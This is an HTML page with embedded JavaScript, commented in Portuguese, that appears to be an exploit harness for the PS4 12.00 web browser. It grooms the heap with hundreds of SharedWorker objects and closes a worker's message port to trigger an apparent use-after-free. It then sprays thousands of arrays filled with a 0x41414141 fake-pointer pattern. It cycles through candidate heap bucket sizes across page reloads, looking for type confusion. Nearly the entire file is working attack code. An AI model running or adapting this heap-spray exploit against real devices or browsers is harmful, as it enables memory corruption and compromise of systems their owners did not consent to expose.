<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 SPECTRUM HUNTER</title>
    
</head>
<body>

    <h1>PS4 12.00 SPECTRUM HUNTER</h1>
    <h2 id="current_status">Inicializando...</h2>
    <div id="log"></div>
    
    <button onclick="reset_test()">REINICIAR TESTES (ZERAR)</button>

    <script>
        function log(msg) {
            var d = document.getElementById("log");
            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        }

        // =================================================================
        // CONFIGURAÇÃO
        // =================================================================
        // Tamanhos de classes comuns do WebKit (IsoHeap Buckets)
        // SharedWorker geralmente é menor que 0x200.
        var CANDIDATE_SIZES = [
            0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80, 0x90, 
            0xA0, 0xA8, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 
            0x100, 0x120, 0x140, 0x180, 0x200
        ];

        var OFFSET_BASE = 0; // Índice atual

        // =================================================================
        // LÓGICA DE AUTOMATIZAÇÃO
        // =================================================================
        function init() {
            // Recupera onde paramos
            var saved = localStorage.getItem("spectrum_idx");
            if (saved) OFFSET_BASE = parseInt(saved);

            if (OFFSET_BASE >= CANDIDATE_SIZES.length) {
                document.getElementById("current_status").innerText = "FIM DO ESPECTRO.";
                log("Todos os tamanhos testados sem crash imediato.");
                log("Isso significa que o spray está 'errando' o buraco ou o IsoHeap é muito forte.");
                return;
            }

            var current_size = CANDIDATE_SIZES[OFFSET_BASE];
            document.getElementById("current_status").innerText = `TESTANDO: 0x${current_size.toString(16).toUpperCase()}`;
            
            log(`Iniciando teste para tamanho: ${current_size} bytes`);
            
            // Executa o exploit com este tamanho
            setTimeout(() => run_exploit(current_size), 1000);
        }

        function next_size() {
            // Avança para o próximo
            OFFSET_BASE++;
            localStorage.setItem("spectrum_idx", OFFSET_BASE);
            
            log("Tamanho falhou (sem crash/leak). Recarregando em 2s...");
            setTimeout(() => location.reload(), 2000);
        }

        function reset_test() {
            localStorage.setItem("spectrum_idx", 0);
            location.reload();
        }

        // =================================================================
        // PAYLOAD & TRIGGER
        // =================================================================
        function build_payload(size) {
            // Arredonda para 4 bytes
            if(size % 4 !== 0) size += (4 - (size % 4));
            var buffer = new Uint32Array(size / 4);
            
            // Padrão de Ponteiro Falso (Type Confusion)
            // 0x41414141
            buffer.fill(0x41414141);
            
            return buffer;
        }

        var workers = [];

        async function run_exploit(size) {
            var payload = build_payload(size);

            // 1. GROOMING RÁPIDO
            for(let i=0; i<380; i++) {
                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
            }

            // 2. TRIGGER (403/404)
            var count = 0;
            var limit = 403 - 380; 

            var it = setInterval(() => {
                if (count >= limit) {
                    clearInterval(it);
                    
                    // MOMENTO DA VERDADE
                    var v = workers.pop();
                    var p = v.port; 
                    v.port.close();
                    
                    // SPRAY
                    var spray = [];
                    for(let k=0; k<8000; k++) {
                        spray.push(new Uint32Array(payload));
                    }

                    // CHECK
                    try {
                        var s = p.toString();
                        if (s.indexOf("MessagePort") === -1) {
                            // SUCESSO!
                            localStorage.setItem("spectrum_success", size);
                            document.body.style.backgroundColor = "green";
                            alert(`SUCESSO! Tamanho encontrado: 0x${size.toString(16)}`);
                            return;
                        }
                    } catch(e) {
                        // Se der erro, pode ser sucesso também
                        log("Erro na leitura: " + e);
                    }

                    // Se chegou aqui, não crashou e não deu leak.
                    // Tenta o próximo tamanho.
                    next_size();
                    return;
                }
                
                try {
                    let w = new SharedWorker("data:text,1", "v"+count);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
                count++;
            }, 50);
        }

        // Start
        init();
    </script>
</body>
</html>
